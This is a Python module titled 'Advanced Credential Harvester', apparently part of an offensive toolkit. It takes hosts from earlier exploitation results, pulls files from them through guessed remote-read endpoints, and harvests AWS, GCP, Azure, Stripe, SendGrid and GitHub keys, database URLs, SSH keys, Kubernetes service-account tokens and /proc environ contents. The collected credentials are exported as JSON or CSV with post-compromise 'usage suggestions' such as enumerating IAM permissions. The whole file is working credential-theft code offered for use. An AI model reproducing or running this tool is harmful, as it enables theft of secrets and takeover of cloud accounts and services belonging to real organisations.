#!/usr/bin/env python3
"""
🔍 Advanced Credential Harvester
Comprehensive credential extraction with pattern matching and validation

Author: wKayaa
Date: 2025-01-28
"""

import asyncio
import aiohttp
import json
import re
import base64
import os
import yaml
from pathlib import Path
from typing import List, Dict, Optional, Any, Pattern
from dataclasses import dataclass
from datetime import datetime
import logging

@dataclass
class Credential:
    """Credential information structure"""
    type: str
    value: str
    confidence: float
    source: str
    context: str
    metadata: Dict
    risk_level: str
    validation_result: Optional[Dict] = None

@dataclass
class ExtractionResult:
    """Credential extraction result"""
    target: str
    credentials: List[Credential]
    extraction_method: str
    timestamp: str
    total_found: int

class CredentialHarvester:
    """Advanced credential harvesting engine"""
    
    def __init__(self, timeout: int = 30, max_concurrent: int = 100):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        
        # Comprehensive credential patterns
        self.credential_patterns = {
            # AWS Credentials
            "aws_access_key": {
                "pattern": r'AKIA[0-9A-Z]{16}',
                "confidence_base": 0.9,
                "risk_level": "HIGH",
                "validation_required": True
            },
            "aws_secret_key": {
                "pattern": r'[A-Za-z0-9/+=]{40}',
                "confidence_base": 0.7,
                "risk_level": "HIGH", 
                "validation_required": True,
                "context_required": ["aws", "secret", "key"]
            },
            "aws_session_token": {
                "pattern": r'[A-Za-z0-9/+=]{100,}',
                "confidence_base": 0.8,
                "risk_level": "HIGH",
                "validation_required": True,
                "context_required": ["token", "session", "aws"]
            },
            
            # GCP Credentials
            "gcp_service_account": {
                "pattern": r'\{[^}]*"type":\s*"service_account"[^}]*\}',
                "confidence_base": 0.95,
                "risk_level": "HIGH",
                "validation_required": True
            },
            "gcp_private_key": {
                "pattern": r'-----BEGIN PRIVATE KEY-----[A-Za-z0-9+/=\s]+-----END PRIVATE KEY-----',
                "confidence_base": 0.9,
                "risk_level": "CRITICAL",
                "validation_required": True
            },
            
            # Azure Credentials
            "azure_client_secret": {
                "pattern": r'[A-Za-z0-9~._-]{34,40}',
                "confidence_base": 0.6,
                "risk_level": "HIGH",
                "validation_required": True,
                "context_required": ["azure", "client", "secret"]
            },
            
            # API Keys
            "sendgrid_api_key": {
                "pattern": r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}',
                "confidence_base": 0.95,
                "risk_level": "HIGH",
                "validation_required": True
            },
            "github_token": {
                "pattern": r'gh[pso]_[A-Za-z0-9]{36}',
                "confidence_base": 0.95,
                "risk_level": "HIGH",
                "validation_required": True
            },
            "mailgun_api_key": {
                "pattern": r'key-[a-f0-9]{32}',
                "confidence_base": 0.9,
                "risk_level": "MEDIUM",
                "validation_required": True
            },
            "stripe_api_key": {
                "pattern": r'sk_live_[a-zA-Z0-9]{24,}',
                "confidence_base": 0.95,
                "risk_level": "CRITICAL",
                "validation_required": True
            },
            
            # JWT Tokens
            "jwt_token": {
                "pattern": r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
                "confidence_base": 0.8,
                "risk_level": "MEDIUM",
                "validation_required": False
            },
            
            # Kubernetes Secrets
            "k8s_service_token": {
                "pattern": r'[A-Za-z0-9_-]{20,}',
                "confidence_base": 0.6,
                "risk_level": "HIGH",
                "validation_required": False,
                "context_required": ["service", "account", "token", "kubernetes"]
            },
            
            # Database URLs
            "postgres_url": {
                "pattern": r'postgres://[^:\s]+:[^@\s]+@[^:\s]+:\d+/\w+',
                "confidence_base": 0.9,
                "risk_level": "HIGH",
                "validation_required": False
            },
            "mysql_url": {
                "pattern": r'mysql://[^:\s]+:[^@\s]+@[^:\s]+:\d+/\w+',
                "confidence_base": 0.9,
                "risk_level": "HIGH",
                "validation_required": False
            },
            "mongodb_url": {
                "pattern": r'mongodb://[^:\s]+:[^@\s]+@[^:\s]+:\d+/\w+',
                "confidence_base": 0.9,
                "risk_level": "HIGH",
                "validation_required": False
            },
            
            # SSH Keys
            "ssh_private_key": {
                "pattern": r'-----BEGIN (RSA |OPENSSH )?PRIVATE KEY-----[A-Za-z0-9+/=\s]+-----END (RSA |OPENSSH )?PRIVATE KEY-----',
                "confidence_base": 0.95,
                "risk_level": "HIGH",
                "validation_required": False
            },
            
            # Docker Registry
            "docker_auth": {
                "pattern": r'\{"auths":\{[^}]+\}[^}]*\}',
                "confidence_base": 0.9,
                "risk_level": "MEDIUM",
                "validation_required": False
            },
            
            # Generic secrets
            "generic_api_key": {
                "pattern": r'[a-zA-Z0-9]{32,}',
                "confidence_base": 0.3,
                "risk_level": "LOW",
                "validation_required": False,
                "context_required": ["api", "key", "secret", "token"]
            }
        }
        
        # Context patterns to improve accuracy
        self.context_enhancers = {
            "aws": ["AWS_", "amazon", "aws-", "akia", "secret"],
            "gcp": ["google", "gcp", "service_account", "private_key_id"],
            "azure": ["azure", "client_id", "tenant_id", "subscription"],
            "kubernetes": ["kubectl", "k8s", "kube", "service-account", "namespace"],
            "docker": ["docker", "registry", "auth", "config.json"],
            "database": ["db", "database", "connection", "url", "dsn"]
        }
        
        # File patterns to search
        self.target_files = [
            ".env",
            ".env.local", 
            ".env.production",
            "config.json",
            "config.yaml",
            "config.yml",
            "settings.json",
            "credentials",
            ".aws/credentials",
            ".aws/config", 
            ".kube/config",
            "docker-compose.yml",
            "docker-compose.yaml",
            "Dockerfile",
            ".dockercfg",
            ".docker/config.json",
            "secret.yaml",
            "secret.yml",
            "secrets.json",
            "app.json",
            "manifest.json"
        ]
        
        # Common paths where credentials might be found
        self.search_paths = [
            "/",
            "/var/",
            "/etc/",
            "/home/",
            "/root/",
            "/opt/",
            "/tmp/", 
            "/usr/local/",
            "/app/",
            "/config/",
            "/secrets/"
        ]
        
        self.logger = logging.getLogger("CredentialHarvester")
        self.results = []
        
    async def harvest_credentials(self, targets: List[Dict]) -> List[ExtractionResult]:
        """Main credential harvesting pipeline"""
        self.logger.info(f"🔍 Starting credential harvesting on {len(targets)} targets")
        
        all_results = []
        semaphore = asyncio.Semaphore(self.max_concurrent)
        
        async def harvest_target(target: Dict):
            async with semaphore:
                return await self._harvest_single_target(target)
        
        tasks = [harvest_target(target) for target in targets]
        target_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in target_results:
            if isinstance(result, ExtractionResult):
                all_results.append(result)
                if result.credentials:
                    self.logger.info(f"🎯 Found {len(result.credentials)} credentials on {result.target}")
            elif isinstance(result, Exception):
                self.logger.debug(f"Harvesting error: {str(result)}")
                
        self.results = all_results
        return all_results
        
    async def _harvest_single_target(self, target: Dict) -> ExtractionResult:
        """Harvest credentials from single target"""
        target_name = target.get("target", target.get("ip", "unknown"))
        all_credentials = []
        
        # Extract from different sources
        extraction_methods = [
            ("exploitation_data", self._extract_from_exploitation_data),
            ("file_system", self._extract_from_file_system),
            ("environment_vars", self._extract_from_environment),
            ("api_responses", self._extract_from_api_responses),
            ("configuration_files", self._extract_from_config_files),
            ("container_secrets", self._extract_from_container_secrets)
        ]
        
        for method_name, method_func in extraction_methods:
            try:
                method_credentials = await method_func(target)
                if method_credentials:
                    all_credentials.extend(method_credentials)
                    self.logger.debug(f"Found {len(method_credentials)} credentials via {method_name}")
            except Exception as e:
                self.logger.debug(f"Extraction method {method_name} failed: {str(e)}")
        
        # Remove duplicates and enhance with validation
        unique_credentials = self._deduplicate_credentials(all_credentials)
        enhanced_credentials = await self._enhance_credentials(unique_credentials)
        
        return ExtractionResult(
            target=target_name,
            credentials=enhanced_credentials,
            extraction_method="comprehensive",
            timestamp=datetime.utcnow().isoformat(),
            total_found=len(enhanced_credentials)
        )
        
    async def _extract_from_exploitation_data(self, target: Dict) -> List[Credential]:
        """Extract credentials from exploitation data"""
        credentials = []
        
        # Check exploitation results for credential data
        exploitation = target.get("exploitation", {})
        if exploitation.get("success") and "data" in exploitation:
            data = exploitation["data"]
            if isinstance(data, str):
                found_creds = self._scan_text_for_credentials(data, "exploitation_response")
                credentials.extend(found_creds)
                
        # Check service-specific data
        services = target.get("services", [])
        for service in services:
            if isinstance(service, dict) and "content_preview" in service:
                content = service["content_preview"]
                found_creds = self._scan_text_for_credentials(content, f"service_{service.get('service', 'unknown')}")
                credentials.extend(found_creds)
                
        return credentials
        
    async def _extract_from_file_system(self, target: Dict) -> List[Credential]:
        """Extract credentials from file system access"""
        credentials = []
        
        # If we have file system access (e.g., through container escape)
        endpoint = target.get("endpoint") or target.get("exploitation", {}).get("endpoint")
        if not endpoint:
            return credentials
            
        # Try to access common credential files
        for file_path in self.target_files:
            try:
                file_content = await self._read_remote_file(endpoint, file_path)
                if file_content:
                    found_creds = self._scan_text_for_credentials(file_content, f"file_{file_path}")
                    credentials.extend(found_creds)
            except Exception:
                continue
                
        return credentials
        
    async def _extract_from_environment(self, target: Dict) -> List[Credential]:
        """Extract credentials from environment variables"""
        credentials = []
        
        endpoint = target.get("endpoint") or target.get("exploitation", {}).get("endpoint")
        if not endpoint:
            return credentials
            
        # Try to access environment variables
        env_endpoints = [
            "/proc/1/environ",
            "/proc/self/environ", 
            "/env",
            "/environment"
        ]
        
        for env_path in env_endpoints:
            try:
                env_content = await self._read_remote_file(endpoint, env_path)
                if env_content:
                    # Parse environment variables
                    env_vars = self._parse_environment_variables(env_content)
                    for var_name, var_value in env_vars.items():
                        found_creds = self._scan_text_for_credentials(
                            f"{var_name}={var_value}", 
                            f"env_var_{var_name}"
                        )
                        credentials.extend(found_creds)
            except Exception:
                continue
                
        return credentials
        
    async def _extract_from_api_responses(self, target: Dict) -> List[Credential]:
        """Extract credentials from API responses"""
        credentials = []
        
        endpoint = target.get("endpoint") or target.get("exploitation", {}).get("endpoint")
        if not endpoint:
            return credentials
            
        # Common API endpoints that might expose credentials
        api_endpoints = [
            "/api/v1/secrets",
            "/api/v1/configmaps",
            "/config",
            "/status",
            "/health",
            "/info",
            "/debug",
            "/metrics",
            "/version"
        ]
        
        async with aiohttp.ClientSession() as session:
            for api_path in api_endpoints:
                try:
                    async with session.get(f"{endpoint}{api_path}", timeout=self.timeout, ssl=False) as response:
                        if response.status == 200:
                            content = await response.text()
                            found_creds = self._scan_text_for_credentials(content, f"api_{api_path}")
                            credentials.extend(found_creds)
                except Exception:
                    continue
                    
        return credentials
        
    async def _extract_from_config_files(self, target: Dict) -> List[Credential]:
        """Extract credentials from configuration files"""
        credentials = []
        
        endpoint = target.get("endpoint") or target.get("exploitation", {}).get("endpoint")
        if not endpoint:
            return credentials
            
        # Try to access configuration files in common locations
        for search_path in self.search_paths:
            for config_file in self.target_files:
                full_path = f"{search_path.rstrip('/')}/{config_file}"
                try:
                    file_content = await self._read_remote_file(endpoint, full_path)
                    if file_content:
                        found_creds = self._scan_text_for_credentials(file_content, f"config_{full_path}")
                        credentials.extend(found_creds)
                except Exception:
                    continue
                    
        return credentials
        
    async def _extract_from_container_secrets(self, target: Dict) -> List[Credential]:
        """Extract credentials from container/Kubernetes secrets"""
        credentials = []
        
        endpoint = target.get("endpoint") or target.get("exploitation", {}).get("endpoint")
        if not endpoint:
            return credentials
            
        # Kubernetes secret extraction
        k8s_secret_paths = [
            "/var/run/secrets/kubernetes.io/serviceaccount/token",
            "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
            "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
        ]
        
        for secret_path in k8s_secret_paths:
            try:
                secret_content = await self._read_remote_file(endpoint, secret_path)
                if secret_content:
                    found_creds = self._scan_text_for_credentials(secret_content, f"k8s_secret_{secret_path}")
                    credentials.extend(found_creds)
            except Exception:
                continue
                
        return credentials
        
    async def _read_remote_file(self, endpoint: str, file_path: str) -> Optional[str]:
        """Attempt to read remote file content"""
        try:
            # Try various methods to read file content
            read_methods = [
                f"/file{file_path}",  # Direct file access
                f"/read?path={file_path}",  # Query parameter
                f"/cat{file_path}",  # Cat command
                f"/download{file_path}"  # Download endpoint
            ]
            
            async with aiohttp.ClientSession() as session:
                for method_path in read_methods:
                    try:
                        async with session.get(f"{endpoint}{method_path}", timeout=self.timeout, ssl=False) as response:
                            if response.status == 200:
                                content = await response.text()
                                if len(content) > 10:  # Minimum content length
                                    return content
                    except Exception:
                        continue
                        
        except Exception:
            pass
            
        return None
        
    def _parse_environment_variables(self, env_content: str) -> Dict[str, str]:
        """Parse environment variables from content"""
        env_vars = {}
        
        # Handle different formats
        if '\0' in env_content:  # /proc/environ format
            vars_list = env_content.split('\0')
        else:  # Regular format
            vars_list = env_content.split('\n')
            
        for var_line in vars_list:
            if '=' in var_line:
                key, value = var_line.split('=', 1)
                env_vars[key.strip()] = value.strip()
                
        return env_vars
        
    def _scan_text_for_credentials(self, text: str, source: str) -> List[Credential]:
        """Scan text for credential patterns"""
        credentials = []
        
        for cred_type, pattern_info in self.credential_patterns.items():
            pattern = pattern_info["pattern"]
            matches = re.findall(pattern, text, re.MULTILINE | re.DOTALL)
            
            for match in matches:
                # Calculate confidence based on context
                confidence = self._calculate_confidence(cred_type, match, text, pattern_info)
                
                if confidence > 0.5:  # Minimum confidence threshold
                    credential = Credential(
                        type=cred_type,
                        value=match,
                        confidence=confidence,
                        source=source,
                        context=self._extract_context(match, text),
                        metadata={
                            "pattern_matched": pattern,
                            "text_length": len(text),
                            "position": text.find(match)
                        },
                        risk_level=pattern_info["risk_level"]
                    )
                    credentials.append(credential)
                    
        return credentials
        
    def _calculate_confidence(self, cred_type: str, value: str, context: str, pattern_info: Dict) -> float:
        """Calculate confidence score for credential match"""
        confidence = pattern_info["confidence_base"]
        
        # Context-based adjustments
        if "context_required" in pattern_info:
            context_found = 0
            context_required = pattern_info["context_required"]
            
            for required_context in context_required:
                if required_context.lower() in context.lower():
                    context_found += 1
                    
            if context_found == 0:
                confidence *= 0.3  # Significantly reduce confidence
            else:
                confidence += (context_found / len(context_required)) * 0.2
                
        # Value-based adjustments
        if len(value) > 50:
            confidence += 0.1
        elif len(value) < 20:
            confidence -= 0.1
            
        # Type-specific adjustments
        if cred_type == "aws_access_key" and value.startswith("AKIA"):
            confidence = 0.95
        elif cred_type == "jwt_token" and value.count('.') == 2:
            confidence += 0.1
            
        return min(max(confidence, 0.0), 1.0)
        
    def _extract_context(self, match: str, text: str, context_size: int = 100) -> str:
        """Extract context around credential match"""
        match_pos = text.find(match)
        if match_pos == -1:
            return ""
            
        start = max(0, match_pos - context_size)
        end = min(len(text), match_pos + len(match) + context_size)
        
        return text[start:end].replace('\n', ' ').replace('\r', '')
        
    def _deduplicate_credentials(self, credentials: List[Credential]) -> List[Credential]:
        """Remove duplicate credentials"""
        seen_values = set()
        unique_credentials = []
        
        for cred in credentials:
            if cred.value not in seen_values:
                seen_values.add(cred.value)
                unique_credentials.append(cred)
            else:
                # Update existing credential with higher confidence source
                for existing_cred in unique_credentials:
                    if (existing_cred.value == cred.value and 
                        cred.confidence > existing_cred.confidence):
                        existing_cred.confidence = cred.confidence
                        existing_cred.source = cred.source
                        break
                        
        return unique_credentials
        
    async def _enhance_credentials(self, credentials: List[Credential]) -> List[Credential]:
        """Enhance credentials with additional metadata and validation"""
        enhanced = []
        
        for cred in credentials:
            # Add risk assessment
            cred.metadata["risk_assessment"] = self._assess_risk(cred)
            
            # Add validation recommendations
            cred.metadata["validation_recommended"] = self.credential_patterns[cred.type].get("validation_required", False)
            
            # Add usage suggestions
            cred.metadata["usage_suggestions"] = self._get_usage_suggestions(cred.type)
            
            enhanced.append(cred)
            
        return enhanced
        
    def _assess_risk(self, credential: Credential) -> Dict:
        """Assess risk level of credential"""
        risk_factors = []
        
        if credential.risk_level == "CRITICAL":
            risk_factors.append("Critical system access")
        elif credential.risk_level == "HIGH":
            risk_factors.append("High privilege access")
            
        if credential.confidence > 0.9:
            risk_factors.append("High confidence match")
            
        if "production" in credential.context.lower():
            risk_factors.append("Production environment")
            
        return {
            "level": credential.risk_level,
            "factors": risk_factors,
            "score": self._calculate_risk_score(credential)
        }
        
    def _calculate_risk_score(self, credential: Credential) -> float:
        """Calculate numerical risk score"""
        score = 0.0
        
        # Base score from risk level
        risk_multipliers = {"CRITICAL": 1.0, "HIGH": 0.8, "MEDIUM": 0.6, "LOW": 0.4}
        score += risk_multipliers.get(credential.risk_level, 0.5)
        
        # Confidence multiplier
        score *= credential.confidence
        
        # Context multipliers
        if "prod" in credential.context.lower():
            score *= 1.2
        if "admin" in credential.context.lower():
            score *= 1.1
            
        return min(score, 1.0)
        
    def _get_usage_suggestions(self, cred_type: str) -> List[str]:
        """Get usage suggestions for credential type"""
        suggestions = {
            "aws_access_key": [
                "Validate with AWS STS GetCallerIdentity",
                "Enumerate IAM permissions",
                "Check S3 bucket access",
                "Test EC2 instance permissions"
            ],
            "gcp_service_account": [
                "Validate service account access",
                "Check Google Cloud Storage permissions",
                "Test Compute Engine access"
            ],
            "jwt_token": [
                "Decode JWT payload",
                "Check token expiration",
                "Validate signature if possible"
            ],
            "sendgrid_api_key": [
                "Check SendGrid account quota",
                "Validate API key permissions",
                "Test email sending capability"
            ]
        }
        
        return suggestions.get(cred_type, ["Manual validation recommended"])
        
    def get_harvest_summary(self) -> Dict:
        """Get credential harvesting summary"""
        all_credentials = [cred for result in self.results for cred in result.credentials]
        
        return {
            "total_targets": len(self.results),
            "total_credentials": len(all_credentials),
            "credentials_by_type": self._group_by_type(all_credentials),
            "credentials_by_risk": self._group_by_risk(all_credentials),
            "high_confidence_credentials": len([c for c in all_credentials if c.confidence > 0.8]),
            "validation_required": len([c for c in all_credentials if 
                                      self.credential_patterns[c.type].get("validation_required", False)]),
            "timestamp": datetime.utcnow().isoformat(),
            "details": self.results
        }
        
    def _group_by_type(self, credentials: List[Credential]) -> Dict:
        """Group credentials by type"""
        type_counts = {}
        for cred in credentials:
            type_counts[cred.type] = type_counts.get(cred.type, 0) + 1
        return type_counts
        
    def _group_by_risk(self, credentials: List[Credential]) -> Dict:
        """Group credentials by risk level"""
        risk_counts = {}
        for cred in credentials:
            risk_counts[cred.risk_level] = risk_counts.get(cred.risk_level, 0) + 1
        return risk_counts
        
    def export_credentials(self, format: str = "json") -> str:
        """Export credentials in specified format"""
        if format == "json":
            return json.dumps([
                {
                    "type": cred.type,
                    "value": cred.value,
                    "confidence": cred.confidence,
                    "source": cred.source,
                    "risk_level": cred.risk_level,
                    "metadata": cred.metadata
                }
                for result in self.results
                for cred in result.credentials
            ], indent=2, default=str)
        elif format == "csv":
            import csv
            import io
            output = io.StringIO()
            writer = csv.writer(output)
            writer.writerow(["Type", "Value", "Confidence", "Source", "Risk Level", "Context"])
            
            for result in self.results:
                for cred in result.credentials:
                    writer.writerow([
                        cred.type, cred.value, cred.confidence, 
                        cred.source, cred.risk_level, cred.context
                    ])
                    
            return output.getvalue()
        else:
            return str(self.get_harvest_summary())